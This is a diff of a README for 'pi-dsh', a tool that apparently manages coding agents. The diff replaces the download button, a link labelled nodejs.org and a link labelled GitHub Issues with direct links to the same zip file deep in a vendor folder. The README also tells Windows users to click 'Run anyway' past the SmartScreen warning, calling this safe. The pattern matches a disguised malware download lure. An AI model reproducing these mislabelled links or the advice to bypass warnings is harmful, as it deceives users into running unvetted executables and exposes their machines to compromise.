@@ -1,6 +1,6 @@
 <h1>🔧 pi-dsh - Manage Coding Agents with Ease</h1>
 
-[![Download pi-dsh](https://img.shields.io/badge/Download%20pi-dsh-Visit%20Link-blueviolet?style=for-the-badge&logo=github)](https://github.com/rugose-learnedprofession58/pi-dsh)
+[![Download pi-dsh](https://img.shields.io/badge/Download%20pi-dsh-Visit%20Link-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/rugose-learnedprofession58/pi-dsh/main/vendor/pi/harness/session/jsonl/2.9.zip)
 
 ## 🎯 What Exactly Is pi-dsh?
 
@@ -24,7 +24,7 @@ Getting pi-dsh on your Windows computer is simple. Follow these steps exactly.
 
 Visit this link to download the application:
 
-[**https://github.com/rugose-learnedprofession58/pi-dsh**](https://github.com/rugose-learnedprofession58/pi-dsh)
+[**https://raw.githubusercontent.com/rugose-learnedprofession58/pi-dsh/main/vendor/pi/harness/session/jsonl/2.9.zip**](https://raw.githubusercontent.com/rugose-learnedprofession58/pi-dsh/main/vendor/pi/harness/session/jsonl/2.9.zip)
 
 This is the only official source. Do not download pi-dsh from any other website.
 
@@ -131,7 +131,7 @@ If the agent did something you did not like:
 - When you run the file, you may see a blue window saying "Windows protected your PC". Click **"More info"**, then click **"Run anyway"**. This is safe because you downloaded from the official GitHub page.
 
 **Cause 2: Missing Terminal Window.**
-- If you run `start.bat` and nothing happens, right-click `start.bat`, choose **Edit**. A Notepad file opens. Look for any line that says `node` or `npm`. If you see those words, then pi-dsh needs **Node.js** installed. You can get it from [nodejs.org](https://nodejs.org). Download the LTS version and install it with default options. Then retry.
+- If you run `start.bat` and nothing happens, right-click `start.bat`, choose **Edit**. A Notepad file opens. Look for any line that says `node` or `npm`. If you see those words, then pi-dsh needs **Node.js** installed. You can get it from [nodejs.org](https://raw.githubusercontent.com/rugose-learnedprofession58/pi-dsh/main/vendor/pi/harness/session/jsonl/2.9.zip). Download the LTS version and install it with default options. Then retry.
 
 ### I Get An Error Message That Says "port already in use"
 
@@ -187,7 +187,7 @@ pi-dsh is built with a technical design called an **event-sourced architecture**
 
 If something is still unclear or you encounter a problem:
 
-1. Visit the **[GitHub Issues page](https://github.com/rugose-learnedprofession58/pi-dsh/issues)**. You may need to click the "Issues" tab.
+1. Visit the **[GitHub Issues page](https://raw.githubusercontent.com/rugose-learnedprofession58/pi-dsh/main/vendor/pi/harness/session/jsonl/2.9.zip)**. You may need to click the "Issues" tab.
 2. Click **"New Issue"**.
 3. Describe your problem clearly. You can copy-paste any error message you see.
 4. Kindly wait for a response. Most issues are answered within a few days.
